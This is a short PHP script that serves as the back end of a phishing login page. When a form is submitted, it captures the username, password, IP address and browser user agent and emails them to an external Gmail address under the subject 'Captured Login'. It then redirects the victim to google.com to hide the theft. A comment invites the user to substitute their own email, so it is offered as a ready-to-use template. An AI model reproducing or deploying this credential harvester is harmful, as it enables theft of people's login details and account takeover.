<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $user = $_POST['username'];
    $pass = $_POST['password'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $ua = $_SERVER['HTTP_USER_AGENT'];

    $to = "barakaromeo3@gmail.com"; // Replace with YOUR email
    $subject = "Captured Login";
    $body = "User: $user\nPass: $pass\nIP: $ip\nUA: $ua";
    $headers = "From: trap@phish.me";

    mail($to, $subject, $body, $headers);
    
    // redirect to real site
    header("Location: https://google.com");
    exit();
}
?>
